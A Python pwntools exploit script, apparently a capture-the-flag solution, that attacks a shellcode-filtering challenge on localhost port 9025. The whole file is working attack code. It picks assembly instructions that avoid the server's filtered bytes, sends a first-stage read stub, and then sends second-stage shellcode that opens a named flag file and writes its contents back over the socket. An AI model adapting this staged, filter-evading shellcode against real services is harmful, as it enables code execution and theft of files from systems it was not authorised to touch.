#!/usr/bin/env python

import argparse
import re
import socket
import sys
import time
from pwn import *

def asmit(code):
    return asm(code, arch='amd64')

def getvalid(cands, filt, msg = '', check = False):
    for cand in cands:
        if not set(filt) & set(asmit(cand) + '\x90'):
            return cand

    if check:
        sys.stderr.write("Fail  getvalid: " + msg + '\n')
        return ''
    return cands[0]

def gen_read(filt, check = False):
    if len(filt) != 128:
        exit(1)
    code = ''


    # registers without rax, rdi, rsi and rdx
    regs = [
            'rcx',
            'rsp',
            'rbp',
            'r8',
            'r9',
            'r10',
            'r11',
            'r12',
            'r13',
            'r14',
            'r15',
            ]
    # set up rsi to be rip
    cands = [
            "lea rsi, 0x48[rip]\n", # 48 8d 35 48 00 00 00
            ]
    for r in regs:
        cands += [
                ("lea %s, [rip]\n" % r)
                + ("mov rsi, %s\n" % r)
                ]
    cand = getvalid(cands, filt, 'rsi <- rip', check)
    if not cand:
        return ''
    code += cand

    # Set rdx to be some large value
    cand = getvalid([
        'add edx, 0x4848\n', # 81 c2 00 00 48 48
        'mov edx, 0x4848\n', # ba 00 00 48 48
        ], filt, 'rdx <- some value', check)
    if not cand:
        return ''
    code += cand

    cand = getvalid([
        'syscall\n', # 0f 05
        ], filt, 'syscall', check)
    if not cand:
        return ''
    code += cand

    print "Successfully created shell code!"
    return code

def gen_open(flag): # rax : fd
    code = ''
    code += 'lea rcx, [rip + 0x300]\n'
    code += 'mov rax, 2\n' # open
    code += 'mov rdi, rcx\n'
    code += 'mov rsi, 0\n'
    code += 'mov rdx, 0\n'
    for c in list(flag):
        code += 'movq [rcx], %d\n' % ord(c)
        code += 'add rcx, 0x1\n'

    code += 'syscall\n'
    return code

def gen_sendfile(out_fd): # In: rax
    code = ''
#    code += 'mov rdi, %d\n' % out_fd
#    code += 'mov rsi, rax\n'
#    code += 'mov rdx, 0\n'
#    code += 'mov r10, 1000\n'
#    code += 'mov rax, 40\n'
#    code += 'syscall\n'

    code = 'lea rbx, [%rip + 0x100]\n' # buf
    code += 'mov rdi, rax\n'
    code += 'mov rax, 0\n'
    code += 'mov rsi, rbx\n'
    code += 'mov rdx, 1000\n'
    code += 'syscall\n'

    code += 'mov rax, 1\n'
    code += 'mov rdi, %d\n' % out_fd
    code += 'mov rsi, rbx\n'
    code += 'mov rdx, 1000\n'
    code += 'syscall\n'
    return code

def gen_shellcode(flag):
    code = ''
    code += gen_open(flag)
    code += gen_sendfile(1)
    return code

def doit():
    parser = argparse.ArgumentParser(description='asg')
    parser.add_argument('--test', dest='test',  action='store_const',
            const=True, default=False, help='Testing of not')
    parser.add_argument('--nocheck', dest='check',  action='store_const',
            const=False, default=True)
    args = parser.parse_args()

    address = 'localhost'
    port = 9025

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((address, port))
    sock.recv(1000) # ignore
    sock.send("\n")

    if args.test:
        time.sleep(0.1) # for sleep 5
    else:
        time.sleep(6)

    s = sock.recv(1000)

    r = re.search(r'these are filtered set of bytes:\n(.*)flag is inside this file: \[(.*)\]', s ,re.DOTALL)

    filt = r.group(1)
    flag = r.group(2)
    code = gen_read(filt, args.check)
    if not code:
        exit(0)

    sock.send(asmit(code))

    if args.test:
        time.sleep(1.1) # for sleep 1
    else:
        time.sleep(5) # for sleep 10

    code = gen_shellcode(flag)
    sock.send(asmit(code))

    print sock.recv(1000) # buena ...

    time.sleep(1)

    print sock.recv(100)
